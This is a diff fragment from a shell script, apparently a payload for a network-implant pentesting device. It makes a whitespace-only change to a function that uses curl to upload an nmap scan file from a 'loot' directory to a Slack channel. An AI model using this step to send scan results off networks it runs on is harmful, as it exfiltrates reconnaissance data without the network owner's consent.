@@ -94,7 +94,7 @@ function slack() {
 		# Curl magic 
 		curl \
 		-F file=@$LOOT_DIR/nmap-scan_$SCAN_M.txt \
-	    -F initial_comment="A network has been discovered!" \
+	        -F initial_comment="A network has been discovered!" \
 		-F channels=#shark \
 		-F token=${SLACKTOKEN} \
 	    https://slack.com/api/files.upload
